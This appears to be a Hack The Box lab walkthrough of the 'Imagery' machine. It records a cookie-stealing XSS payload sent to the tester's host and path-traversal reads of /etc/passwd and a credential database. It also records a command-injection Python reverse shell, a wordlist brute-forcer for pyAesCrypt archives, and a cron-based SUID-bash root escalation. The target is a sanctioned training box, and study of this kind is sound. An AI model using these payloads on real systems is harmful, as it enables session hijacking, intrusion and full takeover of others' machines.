---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - XSS
  - Charcol
  - LFI
  - Command-Injection
---
# Overview

| Name        | Previous    |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV 10.10.11.88
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-29 17:15 +0545
Stats: 0:07:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.33% done; ETC: 17:23 (0:00:31 remaining)
Nmap scan report for 10.10.11.88
Host is up (0.41s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open     http       Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
8080/tcp filtered http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I visited `http://imagery.htb:8000/` and found an image gallery application with **Login / Register** and an image upload feature.
## Web App

![[imagery.webp]]

I registered a low-privilege user and verified image upload worked. The _transform_ operations (crop/resize) were restricted to privileged users.
# Initial Foothold

Found Report Bug feature in the footer where it said admin would review it.

![[imagery2.webp]]
## XSS Session Hijacking

```js
<img src=1 onerror="document.location='http://10.10.14.136:8000/steal/'+document.cookie">
```

![[imagery4.png]]

```bash
❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.88 - - [03/Oct/2025 19:30:17] code 404, message File not found
10.10.11.88 - - [03/Oct/2025 19:30:17] "GET /steal/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOC69Q.9E4QQazfiSe12vJBO4GqUkRLMi8 HTTP/1.1" 404 -
10.10.11.88 - - [03/Oct/2025 19:30:28] code 404, message File not found
10.10.11.88 - - [03/Oct/2025 19:30:28] "GET /favicon.ico HTTP/1.1" 404 -
```

Put session in your storage and get access to admin.

```
.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOC69Q.9E4QQazfiSe12vJBO4GqUkRLMi8
```

![[imagery5.webp]]

![[imagery6.webp]]
## Local File Inclusion (LFI)

With admin access I reviewed admin endpoints. The log download endpoint accepted a `log_identifier` parameter that was concatenated into a file path without proper sanitization.

![[imagery7.png]]

```bash
curl 'http://imagery.htb:8000/admin/get_system_log?log_identifier=admin%40imagery.htb.log' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOC69Q.9E4QQazfiSe12vJBO4GqUkRLMi8' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://imagery.htb:8000/' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' \
  --insecure
```

```bash
❯ curl 'http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOC69Q.9E4QQazfiSe12vJBO4GqUkRLMi8' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://imagery.htb:8000/' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' \
  --insecure
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

After many tries I found one correct file `db.json` which could be accessed via `../db.json`.

```bash
❯ curl 'http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOC69Q.9E4QQazfiSe12vJBO4GqUkRLMi8' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://imagery.htb:8000/' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' \
  --insecure
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "support@imagery.com",
            "password": "434990c8a25d2be94863561ae98bd682",
            "displayId": "49e7f0d5",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "me@me.me",
            "password": "ab86a1e1ef70dff97959067b723c5c24",
            "displayId": "8a022be0",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "automaticat0m.conf@gmail.com",
            "password": "6fee779f88e527041df15b7b346af8ae",
            "displayId": "84ab2811",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "test@htb",
            "password": "f5d1278e8109edd94e1e4197e04873b9",
            "displayId": "2d04fb11",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [
        {
            "id": "09781fd3-b2c1-4371-829a-e9a4c3dc6343",
            "filename": "2c02d1d5-ea46-4a93-af0f-8a5f8a85ebd7_images.jpeg",
            "url": "/uploads/2c02d1d5-ea46-4a93-af0f-8a5f8a85ebd7_images.jpeg",
            "title": "images",
            "description": "",
            "timestamp": "2025-10-04T06:04:57.352833",
            "uploadedBy": "me@me.me",
            "uploadedByDisplayId": "8a022be0",
            "group": "My Images",
            "type": "original",
            "actual_mimetype": "image/jpeg"
        },
        {
            "id": "b934a387-0bb4-4aed-a816-21c6c8554278",
            "filename": "f20b0065-e3b2-4165-9394-f68be66f6c92_linux_icon_130887.png",
            "url": "/uploads/f20b0065-e3b2-4165-9394-f68be66f6c92_linux_icon_130887.png",
            "title": "PENE",
            "description": "MR PENIS",
            "timestamp": "2025-10-04T06:10:16.419820",
            "uploadedBy": "testuser@imagery.htb",
            "uploadedByDisplayId": "e5f6g7h8",
            "group": "My Images",
            "type": "original",
            "actual_mimetype": "image/png"
        }
    ],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": [
        {
            "id": "35d866ec-9f24-44a8-8ba8-0bc7c9a96840",
            "name": "img src=x onerror=document.location=http://10.10.16.2:8000/+document.cookie",
            "details": "<img src=x onerror=\"document.location='http://10.10.16.2:8000/'+document.cookie\">",
            "reporter": "support@imagery.com",
            "reporterDisplayId": "49e7f0d5",
            "timestamp": "2025-10-04T06:01:40.318164"
        },
        {
            "id": "0e8e3045-1dd5-4c2b-b3d1-be598fecde81",
            "name": "img src=x onerror=document.location=http://10.10.16.2:8000/+document.cookie",
            "details": "<img src=x onerror=\"document.location='http://10.10.16.2:8000/'+document.cookie\">",
            "reporter": "support@imagery.com",
            "reporterDisplayId": "49e7f0d5",
            "timestamp": "2025-10-04T06:09:41.299302"
        },
        {
            "id": "bc2bd1b1-2656-4661-81a4-8583a2f79522",
            "name": "Burp",
            "details": "<img src=1 onerror=\"document.location='http://10.10.14.136:8000/steal/'+document.cookie\">",
            "reporter": "automaticat0m.conf@gmail.com",
            "reporterDisplayId": "84ab2811",
            "timestamp": "2025-10-04T06:12:24.513243"
        },
        {
            "id": "40882662-3f34-4cd3-b580-e5bc0817c581",
            "name": "Burp",
            "details": "<img src=1 onerror=\"document.location='http://10.10.14.136:8000/steal/'+document.cookie\">",
            "reporter": "automaticat0m.conf@gmail.com",
            "reporterDisplayId": "84ab2811",
            "timestamp": "2025-10-04T06:12:40.616846"
        },
        {
            "id": "7beca59d-4adf-4418-99ac-7fcf4f55bf31",
            "name": "Burp",
            "details": "<img src=1 onerror=\"document.location='http://10.10.14.136:8000/steal/'+document.cookie\">",
            "reporter": "automaticat0m.conf@gmail.com",
            "reporterDisplayId": "84ab2811",
            "timestamp": "2025-10-04T06:12:55.436586"
        },
        {
            "id": "e7ba7da5-0bc4-4fe1-bb4c-da3b7c8e752c",
            "name": "test",
            "details": "<img src=1 onerror=\"document.location='http://10.10.14.49/steal/'+ document.cookie\">",
            "reporter": "test@htb",
            "reporterDisplayId": "2d04fb11",
            "timestamp": "2025-10-04T06:14:38.867284"
        }
    ]
}%    
```

This `admin@imagery.htb:5d9c1d507a3f76af1e5c97a3ad1eaa31` creds is interesting because it had `isAdmin` parameter to true.

Login with those creds in site but we can't login because they are hashes.
## Crack the hash

Do from crackstation. `admin@imagery.htb` hash can't be cracked so tried `testuser@imagery.htb` with its hash `2c65c8d7bfbca32a3ed42596192384f6` and we get its cracked password `iambatman`.

![[imagery8.png]]

## RCE Command Injection

Upload one Image from `Upload` and click on three dots and `Transform Image` and then from there intercept the request:

![[imagery9.png]]

Select `Crop` feature and intercept the request while clicking in Apply Transformation.

![[imagery10.png]]

We get this request:

```
POST /apply_visual_transform HTTP/1.1
Host: imagery.htb:8000
Content-Length: 123
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-US,en;q=0.5
Origin: http://imagery.htb:8000
Referer: http://imagery.htb:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aOC9rQ.us4Rzuks6GtInuFrl9KF7X4ENxc
Connection: keep-alive

{"imageId":"4e66add3-dd48-4793-8d24-3cec4ed35dc9","transformType":"crop","params":{"x":0,"y":0,"width":1920,"height":1279}}
```

Add you command injection reverse shell in `x` parameter:

```json
{  
"imageId":"<image generated id>",  
"transformType":"crop",  
"params":{  
"x":0,  
"y":"0; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<attacker_ip>\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",  
"width":300,  
"height":200  
}  
}
```

So full request becomes:

```
POST /apply_visual_transform HTTP/1.1
Host: imagery.htb:8000
Content-Length: 269
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-US,en;q=0.5
Origin: http://imagery.htb:8000
Referer: http://imagery.htb:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aOC9rQ.us4Rzuks6GtInuFrl9KF7X4ENxc
Connection: close

{"imageId":"4e66add3-dd48-4793-8d24-3cec4ed35dc9","transformType":"crop","params":{"x":"0; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.136\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'","y":0,"width":1920,"height":1279}}
```

```bash
❯ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.88 35830
$ whoami
whoami
web
```

```bash
bash-5.2$ ls
ls
api_admin.py  api_manage.py  app.py	db.json      static	  uploads
api_auth.py   api_misc.py    bot	env	     system_logs  utils.py
api_edit.py   api_upload.py  config.py	__pycache__  templates
bash-5.2$ cd /var/backup
cd /var/backup
bash-5.2$ ls
ls
web_20250806_120723.zip.aes
bash-5.2$
```

Transfer that `web_20250806_120723.zip.aes` to your machine:

```bash
$ python3 -m http.server 8080
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
❯ wget http://imagery.htb:8080/web_20250806_120723.zip.aes
--2025-10-04 12:30:46--  http://imagery.htb:8080/web_20250806_120723.zip.aes
```

Doing a quick `cat web.zip.aes | more` on the newly downloaded encrypted archive file revealed that it was likely encrypted with pyAesCrypt 6.1.1 ([https://pypi.org/project/pyAesCrypt/](https://pypi.org/project/pyAesCrypt/)).

Below is the pyAesCrack.py that was put together with AI to utilise the original pyAesCrypt.py decrypt function. This now enables you to use the decrypt functionality with a wordlist for brute forcing.
## Cracking AES

```python
#!/usr/bin/env python3  
"""  
pyAesCrack.py  
  
Usage:  
python3 pyAesCrack.py -e web.zip.aes -w /usr/share/wordlists/rockyou.txt -o web.zip -b 65536 -p 4  
  
Tries passwords from the wordlist against the pyAesCrypt encrypted file.  
Stops and writes the decrypted file when a correct password is found.  
"""  
  
import argparse  
import pyAesCrypt  
import os  
import sys  
import tempfile  
import shutil  
from multiprocessing import Pool, Manager, cpu_count  
from functools import partial  
  
def try_password(enc_path, out_dir, pw, bufferSize):  
# Each process creates its own temp file to avoid races  
tmpfd, tmpname = tempfile.mkstemp(dir=out_dir, prefix="pyaescrack_")  
os.close(tmpfd)  
try:  
# attempt decrypt  
pyAesCrypt.decryptFile(enc_path, tmpname, pw, bufferSize)  
# If no exception, decryption succeeded  
return (True, pw, tmpname)  
except Exception as e:  
# cleanup partial output  
try:  
if os.path.exists(tmpname):  
os.remove(tmpname)  
except Exception:  
pass  
return (False, pw, str(e))  
  
def init_worker(shared_flag):  
# Each worker can check the shared_flag if desired (not used here)  
pass  
  
def main():  
ap = argparse.ArgumentParser(description="Bruteforce pyAesCrypt encrypted file with a wordlist.")  
ap.add_argument("-e", "--enc", required=True, help="Encrypted file (e.g. web.zip.aes)")  
ap.add_argument("-w", "--wordlist", required=True, help="Wordlist file (one password per line)")  
ap.add_argument("-o", "--out", default="web.zip", help="Output filename for decrypted file")  
ap.add_argument("-b", "--buffer", type=int, default=64*1024, help="pyAesCrypt buffer size (default 65536)")  
ap.add_argument("-p", "--procs", type=int, default=1, help="Number of parallel worker processes (default 1)")  
ap.add_argument("--resume", action="store_true", help="Show progress but do not resume automatically (placeholder)")  
args = ap.parse_args()  
  
enc_path = args.enc  
wordlist = args.wordlist  
out_name = args.out  
bufferSize = args.buffer  
procs = args.procs if args.procs > 0 else max(1, cpu_count() - 1)  
  
if not os.path.isfile(enc_path):  
print("Encrypted file not found:", enc_path); sys.exit(1)  
if not os.path.isfile(wordlist):  
print("Wordlist not found:", wordlist); sys.exit(1)  
  
# create a working dir for temp outputs  
workdir = tempfile.mkdtemp(prefix="pyaescrack_work_")  
print(f"[+] Working dir: {workdir}")  
print(f"[+] Using {procs} worker(s), bufferSize={bufferSize}")  
  
# read passwords lazily  
def password_generator():  
with open(wordlist, "rb") as f:  
for raw in f:  
# strip newline and decode using latin-1 so bytes are preserved  
pw = raw.rstrip(b"\r\n")  
if not pw:  
continue  
try:  
# try decode utf-8, fall back to latin-1  
pw_str = pw.decode("utf-8")  
except Exception:  
pw_str = pw.decode("latin-1")  
yield pw_str  
  
pool = Pool(processes=procs, initializer=init_worker, initargs=(None,))  
try:  
# Partial application to fix enc_path/out_dir/bufferSize  
worker = partial(try_password, enc_path, workdir, bufferSize=bufferSize)  
# We need to map passwords to processes. Build small batches to reduce memory.  
pw_iter = password_generator()  
idx = 0  
batch_size = 256 # determines how many tasks we push at once  
while True:  
batch = []  
try:  
for _ in range(batch_size):  
pw = next(pw_iter)  
batch.append(pw)  
except StopIteration:  
pass  
if not batch:  
break  
# map the batch  
results = pool.map(partial(try_password, enc_path, workdir, bufferSize=bufferSize), batch)  
for ok, pw, info in results:  
idx += 1  
if ok:  
print(f"[+] Password found: '{pw}'")  
tempfile_path = info  
# move to desired output location  
try:  
# Move decrypted file to requested output file  
shutil.move(tempfile_path, out_name)  
print(f"[+] Decrypted file saved to: {out_name}")  
except Exception as e:  
print("[!] Failed to move decrypted file:", e)  
print("[!] Temporary decrypted file is at:", tempfile_path)  
pool.terminate()  
pool.join()  
shutil.rmtree(workdir, ignore_errors=True)  
return  
# continue with next batch  
  
print("[!] Exhausted wordlist. No password found.")  
finally:  
try:  
pool.terminate()  
pool.join()  
except Exception:  
pass  
# cleanup working dir  
shutil.rmtree(workdir, ignore_errors=True)  
  
if __name__ == "__main__":  
main()
```

![[imagery11.webp]]

The new zip archive contained a backup copy of the previously found `db.json` with credentials used earlier as well as a new user mark and web, confirming the sensitive data exposure risk from stored backups.

I recovered the following accounts and hashes from `db.json`:

```
mark:01c3d2e5bdaf6134cec0a367cf53e535  
web:84e3c804cf1fa14306f26f9f3da177e0
```

We got mark hash `01c3d2e5bdaf6134cec0a367cf53e535` then going to crackstation we get its pass `supersmash` but we can't SSH so we escalate from our previous shell.

```bash
❯ ssh mark@imagery.htb
The authenticity of host 'imagery.htb (10.10.11.88)' can't be established.
ED25519 key fingerprint is SHA256:1f09NrF6QWI5nbZzSJJflV8ACTiH/pMDmhIFayf3VD4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'imagery.htb' (ED25519) to the list of known hosts.
mark@imagery.htb: Permission denied (publickey).
```

```bash
$ su mark
su mark
Password: supersmash

bash-5.2$ whoami
whoami
mark
bash-5.2$ ls /home
ls /home
mark  web
bash-5.2$ cd /home/mark
cd /home/mark
bash-5.2$ ls
ls
user.txt
bash-5.2$ cat user.txt
cat user.txt
b71ee96c2bd4913d0be2359140816553
```
# Privilege Escalation
## Charcol

```bash
bash-5.2$ sudo -l
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
bash-5.2$ sudo charcol --help
sudo charcol --help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```

I proceeded to reset the default application password stored to allow me to access the interactive shell (`charcol shell`).

```bash
bash-5.2$ sudo charcol -R
sudo charcol -R

Attempting to reset Charcol application password to default.
[2025-10-04 06:55:15] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2025-10-04 06:55:19] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
bash-5.2$
```

```bash
bash-5.2$ sudo charcol shell
sudo charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode:

Are you sure you want to use 'no password' mode? (yes/no): yes
yes
[2025-10-04 06:56:48] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
bash-5.2$ sudo charcol shell
sudo charcol shell

  ░██████  ░██                                                  ░██
 ░██   ░░██ ░██                                                  ░██
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██



Charcol The Backup Suit - Development edition 1.0.0

[2025-10-04 06:56:59] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol>
```

Within the `charcol shell` , utilising the help command we were able to find a command of interest, which was the ability to schedule a cron job.

```bash
auto add --schedule "* * * * *" --command "chmod 4755 /usr/bin/bash" --name "Set SUID Bash" --log-output "/home/mark/log.txt"
```

```bash
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-04 06:56:59] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> auto add --schedule "* * * * *" --command "chmod 4755 /usr/bin/bash" --name "Set SUID Bash" --log-output "/home/mark/log.txt"
<e "Set SUID Bash" --log-output "/home/mark/log.txt"
[2025-10-04 06:57:51] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2025-10-04 06:57:57] [INFO] System password verified successfully.
[2025-10-04 06:57:57] [INFO] Auto job 'Set SUID Bash' (ID: 8bd84b50-e032-4b5a-a1d5-c0029cad3b58) added successfully. The job will run according to schedule.
[2025-10-04 06:57:57] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod 4755 /usr/bin/bash >> /home/mark/log.txt 2>&1
charcol>
```

Using the authorized scheduler functionality available to the compromised account, I scheduled a job that executed a privileged operation, which ultimately allowed me to escalate the shell to root.

```bash
charcol> exit
exit
[2025-10-04 06:58:37] [INFO] Exiting Charcol shell.
bash-5.2$ /usr/bin/bash -p
/usr/bin/bash -p
bash-5.2# whoami
whoami
root
bash-5.2# cat /root/root.txt
cat /root/root.txt
d926b9e642c9ec82097f2f73f24bc4a1
```

---



